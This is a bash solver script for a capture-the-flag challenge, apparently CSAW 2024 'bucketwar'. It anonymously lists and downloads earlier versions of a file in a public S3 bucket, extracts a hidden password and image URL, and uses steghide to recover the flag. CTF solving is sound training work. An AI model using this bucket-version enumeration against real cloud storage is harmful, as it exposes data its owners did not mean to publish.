#! /bin/bash


######################
# CONFIRM SITE IS LIVE
######################

AWSregion=us-east-2.amazonaws.com
bucketSite=https://s3.${AWSregion}/${bucket_one_name}/versions.html
flagSite=https://${bucket_two_name}.s3.${AWSregion}/sand-pit-1345726_640.jpg

###############
## AFTER CTF ##
###############
# bucket_one_name=NO_LONGER EXISTS
# bucket_two_name=NO_LONGER_EXISTS
# AWSregion=NO_LONGER_EXISTS
###############
#!!!!!!!!!!!!!!
###############

if [ `curl -v --silent $bucketSite  2>&1 | grep OK | wc -l` -eq "0" ]; then
   echo "${bucketSite} not LIVE. Either site not live or AWS bucket name or region has changed...contant CSAW admins";
   exit;
else
   echo "${bucketSite} seems LIVE. Progressing with solver";
   sleep 2
fi


###################################
# GET VERSIONS ID OF MODIFIED INDEX_V1.html
###################################

tmp_file_prefix=csaw24_bucketwar_versions_tmp
tmp_file=${tmp_file_prefix}_out

for version in $(aws s3api list-object-versions --bucket $bucket_one_name --query "Versions[?VersionId!='null']" --query "Versions[?Key=='index_v1.html']" --no-sign-request | jq '.[] | .VersionId' | tr -d '\"'); do aws s3api get-object --bucket ${bucket_one_name} --key "index_v1.html" --version-id "${version}" ${tmp_file_prefix}_${version}  --no-sign-request; done

###################################
# EXTRACT PASSWORD AND FLAG BUCKET
###################################

password=$(cat ${tmp_file_prefix}* | grep  delete | sed 's/[^,:]*: //g' | sed 's/ --> //g' | head  -1)
echo password for hidden file is: $password
sleep 2


#############################
# REQUEST FLAG URL + STEGHIDE
#############################

url=$(cat ${tmp_file_prefix}* | grep  "sand-pit" | sed 's/.*<img src="//g' | sed 's/">//g' | head -1)
if [[ "$url" == "$flagSite" ]]
then
    curl $url -o ${tmp_file_prefix}_stegfile
    steghide extract -sf ${tmp_file_prefix}_stegfile -p  $password
    echo "FOUND POSSIBLE FLAG:" 
    cat flag.txt
else
    echo "$url is not exected: ${expected_url}"
    exit 1
fi 


###################################
# TEMP FILE CLEANUP
###################################
#
read -p "Cotinue to cleanup of temp files?"

rm ${tmp_file_prefix}*


